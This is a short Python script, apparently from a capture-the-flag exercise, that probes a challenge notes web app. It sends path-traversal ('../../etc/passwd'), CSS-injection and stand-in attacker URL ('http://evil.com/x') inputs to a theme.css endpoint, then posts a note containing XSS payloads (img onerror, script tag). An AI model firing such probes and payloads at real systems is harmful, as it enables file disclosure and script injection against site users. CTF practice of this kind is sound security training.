import requests, re

BASE = 'https://outfjord-your-notes-1860d6ea0037.chall.nnsc.tf'
s = requests.Session()
s.headers.update({'User-Agent':'Mozilla/5.0'})

# Probe theme.css endpoint
for name in ['aurora', 'sunset', "test'", '../../etc/passwd', 'aurora"}body{x:1}', 'http://evil.com/x', 'aurora); @import "http://evil"']:
    r = s.get(BASE + '/theme.css', params={'name': name}, timeout=15)
    print(f'name={name!r}: [{r.status_code}] ct={r.headers.get("Content-Type")}')
    print('  body:', r.text[:300].replace(chr(10),' '))
    print()

# Create a test note to see body handling
r = s.post(BASE + '/api/note', json={'title':'t','body':'<b>hi</b><img src=x onerror=alert(1)><script>alert(2)</script>'}, timeout=15)
print('create note:', r.status_code, r.text[:200])
if r.status_code == 200:
    nid = r.json().get('id')
    r2 = s.get(BASE + f'/api/note/{nid}', timeout=15)
    print('get note:', r2.text[:400])
